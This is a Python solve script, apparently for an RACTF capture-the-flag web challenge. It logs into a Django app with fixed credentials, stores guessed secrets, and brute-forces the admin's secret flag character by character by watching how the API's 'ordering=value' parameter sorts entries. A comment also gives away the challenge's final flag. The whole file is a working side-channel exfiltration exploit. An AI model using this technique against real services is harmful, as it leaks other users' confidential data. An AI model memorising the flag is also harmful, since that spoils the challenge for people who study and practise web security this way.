import requests
from bs4 import BeautifulSoup
import json
import string

def find_owner(orderings, owner):
    for i, ordering in enumerate(orderings):
        if ordering['owner'] == owner:
            return i
    
    #Owner not found in orderings
    return None

session = requests.Session()
url = 'http://193.57.159.27:20830'
login_url = f'{url}/auth/login/'
logout_url = f'{url}/auth/logout/'
api_secret_url = f'{url}/api/secret/'

r = session.get(url = login_url)
parse = BeautifulSoup(r.text, "html.parser")

# Extract csrf token to be able to login
csrf_token = parse.find_all('input')[0]['value']

post_data = {
    'csrfmiddlewaretoken': csrf_token,
    'username': 'agent007',
    'password': 'SecretPassword007.'
}

flag = r'ractf{' # Final flag ractf{data_exf1l_via_s0rt1ng_0c66de47}

# Sign in to agent007
r = session.post(url  = login_url, 
                 data = post_data)

# Let's save some secrets ;)
r = session.post(url = api_secret_url, 
                 json = {
                     'value': flag
                 }, 
                 headers = {
                     'X-CSRFToken': session.cookies['csrftoken']
                 }
)

print(f'Status code === {r.status_code}')
_, owner, _, _ = json.loads(r.text).values() # Get our owner id in order to be able to recognize our position in the final orderings

# When positive means we surpassed the flag value
# When negative means we need to go forward
# When from negative becomes positive it means the previous character was the correct character of the nth pos of the flag
cmp = 0

alphabet = string.digits + ':_`' + string.ascii_letters + '}~'
while not '}' in flag:
    # Iterate through every character in the alphabet
    # Post the flag appended with this character as our little secret and compare the results to bruteforce the characters of the flag
    for c in alphabet:
        r = session.post(url = api_secret_url, 
                    json = {
                        'value': flag + c
                    }, 
                    headers = {
                        'X-CSRFToken': session.cookies['csrftoken']
                    }
        )
        
        orderings = json.loads(
            session.get(url = api_secret_url + '?format=json&ordering=value').text
        )
        
        orderings_user_idx = find_owner(orderings, owner)
        orderings_flag_idx = find_owner(orderings, owner = 1)
        cmp = orderings_flag_idx - orderings_user_idx
        if cmp < 0:
            prev_c = chr(ord(c)-1)
            print(flag + prev_c)
            flag += prev_c
            break
